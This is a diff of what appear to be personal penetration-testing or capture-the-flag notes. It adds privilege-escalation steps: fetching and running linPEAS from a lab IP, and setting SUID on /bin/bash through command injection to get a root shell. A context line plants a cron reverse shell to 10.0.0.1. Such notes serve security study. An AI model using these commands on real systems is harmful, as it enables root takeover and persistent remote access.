@@ -61,13 +61,25 @@ PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP inc
 
 # Privledge Escalation
 
+https://gtfobins.github.io/
+
+Do we have a suid binary? Check on GTFO bins to see if we can use this to get a root shell.
+
+```wget 10.10.10.10:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh```
+
+Upload linPEAS or winPEAS, and see what they find.
+
 ```sudo -l```
-```chmod +s /bin/bash```
-```cp /bin/bash /home/user/elevated-shell; chmod +s /home/user/elevated-shell```
 
+Looks for SUID binaries.
 
-below to find SUID binaries
 ```find / -perm -4000 2>/dev/null```
+
+Looks for any SUID programs on the system.
+```chmod +s /bin/bash```
+If we have command injection anywhere, we can simply plug this into wherever we have command injection, and everytime /bin/bash is called, we get a root shell.
+
+
 
 # Password Cracking
 
@@ -148,6 +160,8 @@ Put the below into a file named backdoor.php, and put it in one of the websites,
 ```crontab -l > mycron && echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> mycron && crontab mycron && rm mycron```
 
 # Neat Links
+
 https://pentestbook.six2dez.com/enumeration/ports
 
 https://www.revshells.com/
+
